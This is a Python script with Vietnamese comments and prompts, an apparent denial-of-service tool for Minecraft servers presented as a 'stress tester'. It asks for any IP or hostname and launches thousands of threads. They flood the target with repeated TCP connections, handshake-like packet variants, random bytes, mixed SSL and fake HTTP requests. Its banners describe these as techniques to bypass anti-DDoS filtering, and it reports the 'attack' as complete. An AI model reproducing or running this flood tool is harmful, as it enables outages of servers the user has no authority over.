import socket
import threading
import time
import struct
import os
import random
import ssl
from datetime import datetime

class UltimateMinecraftStressTester:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats = {
            'total_packets': 0,
            'successful_connections': 0,
            'failed_connections': 0,
            'connection_errors': 0,
            'attack_start': 0,
            'peak_rate': 0,
            'active_threads': 0,
            'last_update': 0,
            'variants_sent': 0,
            'ssl_connections': 0
        }
        self.lock = threading.Lock()
        self.server_status = "UNKNOWN"
        self.status_color = "\033[93m"
        self.packet_cache = {}
        self.user_agents = [
            "Mozilla/5.0", "Chrome/91.0", "Safari/537.36",
            "Java/1.8.0", "Python-urllib/3.9", "MinecraftClient/1.12.2"
        ]
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

    def colored_text(self, text, color_code):
        return f"{color_code}{text}\033[0m"

    def create_variant_packets(self, host, port):
        """Tạo nhiều biến thể packet để bypass filter"""
        packets = []
        versions = [47, 107, 210, 316, 404]  # Các phiên bản protocol khác nhau
        
        for version in versions:
            host_encoded = host.encode('utf-8')
            packet = bytearray()
            packet.append(0x00)
            packet.extend(struct.pack('>b', version))
            packet.extend(struct.pack('>b', len(host_encoded)) + host_encoded)
            packet.extend(struct.pack('>H', port))
            packet.append(0x01)
            packets.append(struct.pack('>b', len(packet)) + packet)
        
        # Thêm các biến thể ngẫu nhiên
        for _ in range(5):
            random_packet = os.urandom(random.randint(32, 128))
            packets.append(random_packet)
            
        return packets

    def ultra_worker(self, target, port, use_ssl=False):
        """Worker tốc độ cao với nhiều kỹ thuật bypass"""
        with self.lock:
            self.stats['active_threads'] += 1

        packets = self.create_variant_packets(target, port)
        user_agent = random.choice(self.user_agents)
        
        while self.running:
            try:
                # Tạo socket với các tùy chọn tối ưu
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(1.5)
                
                if use_ssl and random.random() > 0.7:  # 30% kết nối dùng SSL
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=target)
                    with self.lock:
                        self.stats['ssl_connections'] += 1
                
                # Kết nối với TCP Fast Open (nếu hỗ trợ)
                sock.connect((target, port))
                
                # Gửi các biến thể packet
                for packet in random.sample(packets, min(3, len(packets))):
                    sock.sendall(packet)
                    with self.lock:
                        self.stats['total_packets'] += 1
                        self.stats['variants_sent'] += 1
                        self.stats['successful_connections'] += 1
                
                # Giả lập HTTP request đôi khi
                if random.random() > 0.9:  # 10% request
                    http_header = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {user_agent}\r\n\r\n"
                    sock.sendall(http_header.encode())
                
                sock.close()
                
            except socket.timeout:
                with self.lock:
                    self.stats['failed_connections'] += 1
                try:
                    sock.close()
                except:
                    pass
                    
            except Exception as e:
                with self.lock:
                    self.stats['connection_errors'] += 1
                try:
                    sock.close()
                except:
                    pass

        with self.lock:
            self.stats['active_threads'] -= 1

    def status_checker(self, target, port):
        """Kiểm tra trạng thái server với nhiều phương pháp"""
        methods = ['direct', 'ssl', 'http']
        while self.running:
            try:
                method = random.choice(methods)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                if method == 'ssl':
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=target)
                
                sock.connect((target, port))
                
                if method == 'http':
                    sock.sendall(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
                    response = sock.recv(1024)
                    if b"HTTP" in response:
                        self.server_status = "UP (HTTP)"
                        self.status_color = "\033[92m"
                else:
                    sock.sendall(self.create_variant_packets(target, port)[0])
                    if sock.recv(1):
                        self.server_status = "UP (MC)"
                        self.status_color = "\033[92m"
                
                sock.close()
            except:
                self.server_status = "DOWN"
                self.status_color = "\033[91m"
            
            time.sleep(2)

    def print_stats(self):
        """Hiển thị thống kê chi tiết"""
        last_count = 0
        while self.running:
            now = time.time()
            elapsed = max(1, now - self.stats['attack_start'])
            
            with self.lock:
                current_count = self.stats['total_packets']
                current_rate = (current_count - last_count) / (now - self.stats['last_update']) if self.stats['last_update'] else 0
                
                if current_rate > self.stats['peak_rate']:
                    self.stats['peak_rate'] = current_rate
                
                status_display = f"{self.status_color}{self.server_status}\033[0m"
                
                print(f"\r\033[1;37m[ULTRA] Packets: \033[1;35m{current_count:,}\033[0m | "
                      f"Rate: \033[1;32m{current_rate:,.0f}/s (Peak: {self.stats['peak_rate']:,.0f}/s)\033[0m | "
                      f"Success: \033[1;34m{self.stats['successful_connections']:,}\033[0m | "
                      f"Variants: \033[1;36m{self.stats['variants_sent']:,}\033[0m | "
                      f"SSL: \033[1;33m{self.stats['ssl_connections']:,}\033[0m | "
                      f"Threads: \033[1;35m{self.stats['active_threads']}\033[0m | "
                      f"Status: {status_display}", 
                      end="", flush=True)
                
                last_count = current_count
                self.stats['last_update'] = now
            
            time.sleep(0.2)

    def start_attack(self, target, port, max_threads=3000, use_ssl=False):
        print("\n" + self.colored_text("🔥 ULTIMATE MINECRAFT ANTI-DDOS STRESS TESTER 🔥", "\033[1;31m"))
        print(self.colored_text(f"💀 Target: {target}:{port}", "\033[1;33m"))
        print(self.colored_text(f"🚀 Threads: {max_threads}", "\033[1;33m"))
        print(self.colored_text(f"🔐 SSL Mix: {'ON' if use_ssl else 'OFF'}", "\033[1;35m"))
        print(self.colored_text("⚡ Bypass Techniques: Variant Packets, SSL Mixing, HTTP Faking", "\033[1;36m"))
        
        self.running = True
        self.stats['attack_start'] = time.time()
        self.stats['last_update'] = time.time()
        
        # Khởi chạy thread kiểm tra trạng thái
        threading.Thread(target=self.status_checker, args=(target, port), daemon=True).start()
        
        # Khởi chạy thread hiển thị thống kê
        threading.Thread(target=self.print_stats, daemon=True).start()
        
        # Khởi chạy các worker với tốc độ cao
        for _ in range(max_threads):
            t = threading.Thread(target=self.ultra_worker, args=(target, port, use_ssl))
            t.daemon = True
            t.start()
            self.threads.append(t)
            time.sleep(0.001)

        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n" + self.colored_text("🛑 Nhận tín hiệu dừng...", "\033[1;31m"))
        
        self.stop_attack()

    def stop_attack(self):
        self.running = False
        for t in self.threads:
            t.join(timeout=0.1)
        
        print("\n\n" + self.colored_text("💀 TẤN CÔNG HOÀN TẤT 💀", "\033[1;31m"))
        print(self.colored_text(f"• Tổng packets: {self.stats['total_packets']:,}", "\033[1;37m"))
        print(self.colored_text(f"• Kết nối thành công: {self.stats['successful_connections']:,}", "\033[1;32m"))
        print(self.colored_text(f"• Biến thể packet: {self.stats['variants_sent']:,}", "\033[1;36m"))
        print(self.colored_text(f"• SSL Connections: {self.stats['ssl_connections']:,}", "\033[1;33m"))
        print(self.colored_text(f"• Tốc độ cao nhất: {self.stats['peak_rate']:,.0f} packets/s", "\033[1;35m"))

if __name__ == "__main__":
    tester = UltimateMinecraftStressTester()
    try:
        print("\n" + tester.colored_text("💥 MINECRAFT ULTIMATE STRESS TESTER - ANTI-DDOS BYPASS", "\033[1;31m"))
        target = input(tester.colored_text("Nhập IP/hostname server: ", "\033[1;37m")).strip()
        port = int(input(tester.colored_text("Nhập cổng (mặc định 25565): ", "\033[1;37m")) or 25565)
        threads = int(input(tester.colored_text(f"Số luồng (500-{os.cpu_count() * 1500}): ", "\033[1;37m")) or 3000)
        ssl_mix = input(tester.colored_text("Kết hợp SSL? (y/n): ", "\033[1;37m")).lower() == 'y'
        
        tester.start_attack(
            target=target,
            port=port,
            max_threads=max(500, min(os.cpu_count() * 1500, threads)),
            use_ssl=ssl_mix
        )
    except Exception as e:
        print(tester.colored_text(f"❌ Lỗi: {str(e)}", "\033[1;31m"))
    finally:
        tester.stop_attack()